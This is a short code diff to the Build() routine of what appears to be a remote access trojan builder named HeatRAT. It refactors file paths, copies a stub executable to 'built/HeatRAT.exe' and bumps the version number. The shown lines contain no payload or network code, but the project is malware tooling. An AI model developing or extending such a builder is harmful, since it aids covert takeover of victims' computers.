@@ -17,6 +17,7 @@
 
 #include "main.h"
 #include "transfer.h"
+#include "modules.h"
 
 
 
@@ -99,9 +100,7 @@ void Build()
 	FlushConsoleInputBuffer(hConsole);
 	int col = 9;
 	string something = "";
-	string ports = "Modules\\Preferences\\ports.txt";
 	bool openPort = false;
-	char stub[] = "Modules/stub/Stub.exe";
 
 	cout << "\n\n";
 
@@ -118,7 +117,7 @@ void Build()
 	col = 11;
 	SetConsoleTextAttribute(hConsole, col);
 	cin >> something;
-	ifstream file(ports);
+	ifstream file(Modules::prefrences);
 	if (file.is_open())
 	{
 		string line;
@@ -180,9 +179,9 @@ void Build()
 		}
 		printf("]\n\n");
 
-		fileCopy("Modules/stub/Stub.exe", "builded/HeatRAT.exe");//fix here
-		string version = "3.0.3";
-		string log = "builded\\log.txt";
+		fileCopy("resources/stub.exe", "built/HeatRAT.exe");
+		string version = "4.0.0";
+		string log = "built\\log.txt";
 		srand(time(0));
 		ofstream file(log, ios::app);
 		if (file.is_open())
